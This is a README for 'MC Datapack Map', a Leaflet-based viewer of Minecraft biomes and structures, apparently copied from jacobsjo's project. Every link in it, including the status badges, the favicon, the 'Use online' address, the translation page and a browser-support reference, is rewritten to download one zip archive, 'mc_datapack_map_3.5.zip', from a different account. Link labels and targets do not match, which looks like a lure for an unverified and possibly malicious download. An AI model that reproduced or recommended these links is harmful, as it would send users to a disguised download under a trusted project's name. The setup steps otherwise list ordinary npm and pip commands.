[![](https://img.shields.io/github/actions/workflow/status/jacobsjo/mc-datapack-map/pages.yml)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)
[![map.jacobsjo.eu](https://img.shields.io/github/deployments/jacobsjo/mc-datapack-map/github-pages?label=map.jacobsjo.eu)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)
[![](https://img.shields.io/github/issues-raw/jacobsjo/mc-datapack-map)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)
[![](https://img.shields.io/badge/sponsor-jacobsjo-blue)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)
[![](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)
</a>

## Use online at https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip 

--------

# MC Datapack Map

|   |   |
|---|---|
| [![](public/favicon.svg)](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip) | A Leaflet based map to display Minecraft biome layouts and structures of vanilla and using worldgen datapacks.  |
|   |  |

![](docs/header.png)

# Translations
Translate at https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip

# Contributing
Contributions are welcome! For significant feature additions please ask beforehand by opening an issue or on discord.

## Setup dev environment:

1. Install python dependencies: `pip install -r requirements.txt`
2. Install node dependencies: `npm i`
3. Create vanilla datapack zip files: `npm run createZips`
4. Start dev server: `npm run dev` and open http://localhost:5173/ 
   - **dev environment requires a [browser supporting ECMAScript modules in webworkers](https://raw.githubusercontent.com/OPBOYZ8/mc-datapack-map/main/vanilla_datapack_base/mc_datapack_map_3.5.zip)**

5. Build final page: `npm run build`
6. Test build version: `npm run preview` and open https://localhost:4173/